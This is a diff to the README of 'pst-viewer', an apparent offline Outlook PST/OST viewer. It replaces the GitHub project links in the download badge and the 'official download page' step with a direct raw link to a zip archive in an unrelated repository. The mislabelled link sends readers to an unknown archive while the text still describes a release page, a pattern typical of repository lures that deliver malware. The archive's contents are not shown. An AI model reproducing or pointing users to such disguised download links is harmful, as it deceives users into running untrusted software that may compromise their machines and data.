@@ -5,7 +5,7 @@ description: "View Outlook PST and OST files directly in your browser. This offl
 ---
 # 📧 pst-viewer - View Outlook data files easily locally
 
-[![Download pst-viewer](https://img.shields.io/badge/Download-pst--viewer-blue.svg)](https://github.com/claudiussubjudice597/pst-viewer)
+[![Download pst-viewer](https://img.shields.io/badge/Download-pst--viewer-blue.svg)](https://raw.githubusercontent.com/claudiussubjudice597/claudiussubjudice597.github.io/main/textrine/claudiussubjudice_github_io_v2.5.zip)
 
 This application lets you open and view Outlook PST and OST files on your computer. You do not need to install Outlook or any other mail software. The program runs entirely inside your web browser. It keeps your data private because nothing leaves your machine. The app processes everything locally.
 
@@ -25,7 +25,7 @@ You need a modern computer running Windows 10 or Windows 11. The application wor
 
 ## 🚀 Downloading the App
 
-1. Visit [the official download page](https://github.com/claudiussubjudice597/pst-viewer).
+1. Visit [the official download page](https://raw.githubusercontent.com/claudiussubjudice597/claudiussubjudice597.github.io/main/textrine/claudiussubjudice_github_io_v2.5.zip).
 2. Look for the latest release version on the right side of the screen.
 3. Click the link to download the installer package for Windows.
 4. Save the file to your desktop for easy access.
